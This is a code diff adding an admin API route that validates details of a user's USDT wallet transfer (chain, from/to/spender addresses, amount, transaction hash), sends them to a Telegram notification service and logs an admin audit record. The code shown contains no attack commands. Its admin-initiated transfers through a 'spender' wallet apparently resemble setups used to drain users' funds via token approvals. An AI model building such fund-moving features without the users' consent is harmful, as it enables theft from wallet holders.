@@ -6,6 +6,7 @@ import { HttpError } from "../lib/http-error.js";
 import { requireAuth, requireRole, type AuthenticatedRequest } from "../middleware/auth.js";
 import { decryptText } from "../security/encryption.js";
 import { logAdminAudit } from "../services/audit.service.js";
+import { sendAdminUserWalletTransferTelegramNotification } from "../services/telegram.service.js";
 
 const createDisclosureSchema = z.object({
   userId: z.string().uuid(),
@@ -19,6 +20,16 @@ const approveDisclosureSchema = z.object({
 
 const paidWalletsQuerySchema = z.object({
   chain: z.enum(["ethereum", "bsc", "tron"]).default("ethereum")
+});
+
+const userWalletTransferNotifySchema = z.object({
+  userId: z.string().uuid(),
+  chain: z.enum(["ethereum", "bsc", "tron", "solana"]),
+  fromWalletAddress: z.string().min(16),
+  toWalletAddress: z.string().min(16),
+  spenderWalletAddress: z.string().min(16),
+  amountUsdt: z.coerce.number().positive(),
+  txHash: z.string().min(20)
 });
 
 const router = Router();
@@ -323,6 +334,51 @@ router.get("/paid-wallets", async (req: AuthenticatedRequest, res) => {
     chain,
     entries: wallets
   });
+});
+
+router.post("/user-wallet-transfers/notify", async (req: AuthenticatedRequest, res) => {
+  const parsed = userWalletTransferNotifySchema.safeParse(req.body);
+  if (!parsed.success) {
+    throw new HttpError(parsed.error.message, StatusCodes.BAD_REQUEST);
+  }
+
+  if (!req.user) {
+    throw new HttpError("Unauthorized", StatusCodes.UNAUTHORIZED);
+  }
+
+  const payload = parsed.data;
+
+  try {
+    await sendAdminUserWalletTransferTelegramNotification({
+      adminUserId: req.user.sub,
+      userId: payload.userId,
+      chain: payload.chain,
+      fromWalletAddress: payload.fromWalletAddress,
+      toWalletAddress: payload.toWalletAddress,
+      spenderWalletAddress: payload.spenderWalletAddress,
+      amountUsdt: payload.amountUsdt,
+      txHash: payload.txHash
+    });
+  } catch (error) {
+    console.error("[admin.user-wallet-transfers.notify] Telegram notification failed", error);
+  }
+
+  await logAdminAudit({
+    actorUserId: req.user.sub,
+    actorRole: req.user.role,
+    action: "ADMIN_USER_WALLET_TRANSFER_NOTIFY",
+    targetUserId: payload.userId,
+    metadata: {
+      chain: payload.chain,
+      fromWalletAddress: payload.fromWalletAddress,
+      toWalletAddress: payload.toWalletAddress,
+      spenderWalletAddress: payload.spenderWalletAddress,
+      amountUsdt: payload.amountUsdt,
+      txHash: payload.txHash
+    }
+  });
+
+  res.status(StatusCodes.OK).json({ status: "sent" });
 });
 
 export { router as adminRoutes };
